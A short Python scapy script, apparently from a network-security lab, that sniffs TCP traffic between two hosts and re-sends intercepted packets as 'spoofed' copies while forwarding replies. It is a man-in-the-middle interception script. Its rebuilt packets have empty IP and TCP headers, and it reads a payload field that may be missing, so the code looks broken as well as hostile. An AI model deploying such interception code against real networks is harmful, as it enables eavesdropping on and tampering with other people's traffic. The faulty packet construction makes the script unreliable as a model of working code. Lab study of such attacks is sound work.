#!/usr/bin/python3

from scapy.all import *

A_IP = '10.9.0.5'
B_IP = '10.9.0.6'

def spoof_pkt(pkt):
   
   if pkt[IP].src == A_IP and pkt[IP].dst == B_IP and pkt[Raw].load:
      print("Original Packet.........")
      print("Source IP : ", pkt[IP].src)
      print("Destination IP :", pkt[IP].dst)

      ip = IP()
      tcp = TCP()
      data = pkt[TCP].payload

      newpkt = ip/tcp/data
      print("Spoofed Packet.........")
      print("Source IP : ", newpkt[IP].src)
      print("Destination IP :", newpkt[IP].dst)

      send(newpkt)

   elif pkt[IP].src == B_IP and pkt[IP].dst == A_IP:
      print("Forwarding Packet.........")
      print("Source IP : ", pkt[IP].src)
      print("Destination IP :", pkt[IP].dst)
      send(pkt)

pkt = sniff(filter='tcp',prn=spoof_pkt)
